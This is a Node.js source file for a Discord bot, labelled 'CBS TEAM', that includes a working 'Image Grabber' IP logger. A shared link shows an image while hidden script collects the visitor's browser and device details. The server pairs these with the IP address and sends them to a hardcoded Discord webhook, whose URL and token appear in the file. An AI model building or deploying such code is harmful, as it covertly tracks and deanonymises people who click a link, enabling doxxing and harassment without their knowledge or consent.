const { Client, GatewayIntentBits, REST, Routes, Collection, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const dotenv = require('dotenv');
const cron = require('node-cron');
const express = require('express');
const fs = require('fs');
const path = require('path');

dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ]
});

client.commands = new Collection();
client.menuCommands = new Collection();

const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
const commands = [];

for (const file of commandFiles) {
  const command = require(`./commands/${file}`);
  if (command.data) {
    client.commands.set(command.data.name, command);
    commands.push(command.data.toJSON());
  }
  if (command.name) {
    client.menuCommands.set(command.name, command);
  }
}

client.once('ready', async () => {
  console.log(`✅ ${client.user.tag} está online!`);
  console.log(`📊 Servidores: ${client.guilds.cache.size}`);

  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  try {
    console.log('🔄 Registrando comandos...');
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log(`✅ ${commands.length} comandos registrados!`);
  } catch (error) {
    console.error('❌ Erro:', error);
  }

  client.user.setPresence({
    activities: [{ name: '!menu | CBS TEAM', type: 3 }],
    status: 'online'
  });

  cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
  console.log('📋 Digite !menu no Discord');
  console.log('📸 Digite /img para gerar Image Grabber');
});

// ============ INTERAÇÕES ============
client.on('interactionCreate', async interaction => {
  if (interaction.isCommand()) {
    const command = client.commands.get(interaction.commandName);
    if (!command) return;
    try {
      await command.execute(interaction, client);
    } catch (error) {
      console.error(error);
      await interaction.reply({ content: '❌ Erro.', flags: 64 });
    }
  }

  if (interaction.isModalSubmit()) {
    const modalId = interaction.customId;
    // ... (modais existentes)
  }

  if (interaction.isButton()) {
    // ... (botões existentes)
  }
});

client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.content.startsWith('!')) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();
  const command = client.menuCommands.get(commandName);
  if (!command) return;
  try {
    await command.execute(message, args, client);
  } catch (error) {
    console.error(error);
    await message.reply('❌ Erro.');
  }
});

// ==================== SERVIDOR HTTP COM IMAGE GRABBER ====================
const app = express();
const port = process.env.PORT || 3000;
app.use(express.static('public'));
app.use(express.json());

// Armazenar dados
const ipData = {};
const imageLinks = {}; // guarda a imagem escolhida para cada ID

// Webhook
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528810633750122506/Rl3CpBXoq4Q14pMHMlX_ZHmJwSjK9TPJzqMu3rrpI6RFoO-HwMrsEnEzXjaz_ram4_MO';

// Função para enviar dados ao webhook
async function enviarWebhook(id, dados) {
  if (!dados) return;
  const embed = {
    title: '📸 NOVO CLIQUE CAPTURADO!',
    color: 0xFF0000,
    fields: [
      { name: '🌐 IP', value: dados.ip || 'Desconhecido', inline: true },
      { name: '💻 Dispositivo', value: dados.device || 'Desconhecido', inline: true },
      { name: '🌍 Navegador', value: dados.browser || 'Desconhecido', inline: true },
      { name: '📱 SO', value: dados.os || 'Desconhecido', inline: true },
      { name: '🖥️ Resolução', value: dados.resolution || 'Desconhecido', inline: true },
      { name: '🌐 Idioma', value: dados.language || 'Desconhecido', inline: true },
      { name: '🕐 Timezone', value: dados.timezone || 'Desconhecido', inline: true },
      { name: '📱 User-Agent', value: dados.userAgent || 'Desconhecido', inline: false },
      { name: '📅 Data/Hora', value: dados.timestamp || 'Desconhecido', inline: true },
      { name: '🆔 ID', value: `\`${id}\``, inline: true }
    ],
    footer: { text: 'CBS TEAM - Image Grabber' },
    timestamp: new Date()
  };
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    console.log(`📨 Webhook enviado para ID: ${id}`);
  } catch (e) {
    console.log('❌ Erro ao enviar webhook:', e);
  }
}

// Rota para servir a página com a imagem e capturar dados
app.get('/img/:id', (req, res) => {
  const id = req.params.id;
  const imagemUrl = imageLinks[id] || 'https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif';

  // HTML que exibe a imagem e coleta dados do navegador
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>CBS TEAM</title>
      <meta property="og:image" content="${imagemUrl}">
      <style>
        body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#0a0a0a; flex-direction:column; font-family:Arial; }
        img { max-width:90%; max-height:90%; border-radius:10px; }
        .loading { color:#ff0000; font-size:18px; margin-top:20px; animation:pulse 2s infinite; }
        @keyframes pulse { 0%{opacity:0.3;} 50%{opacity:1;} 100%{opacity:0.3;} }
      </style>
    </head>
    <body>
      <img src="${imagemUrl}" alt="CBS TEAM">
      <div class="loading">🔥 CBS TEAM ESTEVE AQUI!</div>
      <script>
        // Coleta dados do navegador
        const data = {
          resolution: window.screen.width + 'x' + window.screen.height,
          language: navigator.language || navigator.languages[0],
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };
        // Envia para o servidor
        fetch('/api/coletar/${id}', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        }).then(() => console.log('✅ Dados enviados'))
          .catch(err => console.log('❌ Erro:', err));
      </script>
    </body>
    </html>
  `);
});

// Rota para receber dados do navegador
app.post('/api/coletar/:id', express.json(), async (req, res) => {
  const id = req.params.id;
  const navegadorData = req.body;
  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || navegadorData.userAgent || 'Desconhecido';

  // Extrai dispositivo, OS, navegador
  let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido';
  if (userAgent) {
    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'MacOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';
    else if (userAgent.includes('Opera')) browser = 'Opera';
    if (userAgent.includes('Mobile')) device = 'Celular';
    else if (userAgent.includes('Tablet')) device = 'Tablet';
    else device = 'Computador';
  }

  const dadosCompletos = {
    ip: userIP,
    device: `${device} (${os})`,
    browser: browser,
    os: os,
    resolution: navegadorData.resolution || 'Desconhecido',
    language: navegadorData.language || 'Desconhecido',
    timezone: navegadorData.timezone || 'Desconhecido',
    userAgent: userAgent,
    timestamp: navegadorData.timestamp || new Date().toISOString()
  };

  ipData[id] = dadosCompletos;
  await enviarWebhook(id, dadosCompletos);
  res.json({ status: 'ok' });
});

// Rota para ver dados (opcional)
app.get('/dados/:id', (req, res) => {
  const id = req.params.id;
  if (ipData[id]) res.json(ipData[id]);
  else res.json({ error: 'Dados não encontrados' });
});

// Rota principal
app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));

app.listen(port, () => {
  console.log(`🌐 HTTP rodando na porta ${port}`);
  console.log(`📸 Image Grabber: https://cbsteam.onrender.com/img/ID`);
  console.log(`📨 Webhook configurado: ${WEBHOOK_URL}`);
});

// ==================== LOGIN ====================
client.login(process.env.DISCORD_TOKEN);

process.on('unhandledRejection', error => console.error('❌ Erro não tratado:', error));
process.on('uncaughtException', error => console.error('❌ Exceção não capturada:', error));